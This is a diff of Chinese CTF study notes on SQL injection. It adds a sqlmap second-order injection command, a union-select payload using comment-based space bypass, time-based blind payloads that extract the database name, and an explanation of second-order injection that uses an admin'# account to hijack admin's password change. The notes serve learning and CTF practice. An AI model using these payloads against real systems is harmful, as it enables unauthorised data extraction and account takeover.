@@ -46,7 +46,7 @@ python sqlmap.py -u <url> --referer="ctf.show" -D ctfshow_web -T ctfshow_user -C
 
 不询问用户输入，使用默认行为
 
-#### `--safe-url`
+#### `--safe-url` 
 
 设置在测试目标地址前访问的安全链接，有的链接需要鉴权，确定是由安全链接跳转过来的
 
@@ -151,6 +151,14 @@ S:Stacked queries 堆叠注入
 T：Time-based blind 基于时间的盲注
 
 Q：lnline queries 内联查询注入
+```
+
+#### 二次注入
+
+```
+sqlmap -r genres.request --second-req feed.request --batch --tamper=space2comment --technique=U --level 5
+
+需要一个注入页面和一个二次注入页面
 ```
 
 例如：
@@ -402,6 +410,10 @@ sql语句：select * from cms where id = "33"";
 2' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+
 ```
 
+```
+group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()
+```
+
 查询列名
 
 ```
@@ -517,6 +529,19 @@ limit 0,1 是从第零行开始查询 1 行
 ```
 
 ### 3.时间盲注
+
+判断库名长度
+
+```
+?id=1' and if(length(database())>8,sleep(2),0) --+
+```
+
+判断库名
+
+```
+?id=1' and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+
+此为判断第一个字母的ascii码是否为115
+```
 
 
 
@@ -870,3 +895,16 @@ if __name__=='__main__':
 flask转发脚本，将测试可以注入的点用payload代替即可
 
 然后配合sqlmap使用
+
+# 10.二次注入
+
+二次注入的原理，在第一次进行数据库插入数据的时候，使用了 **addslashes** 、**get_magic_quotes_gpc**、**mysql_escape_string**、**mysql_real_escape_string**等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。
+比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。
+
+存入数据库的为admin'#登录该用户的情况下进行修改密码，实际上执行的语句是
+
+```
+“UPDATE users SET PASSWORD=‘123456’ where username=‘admin’#’ and password=’$curr_pass’”
+```
+
+实际上修改的是**admin**的密码
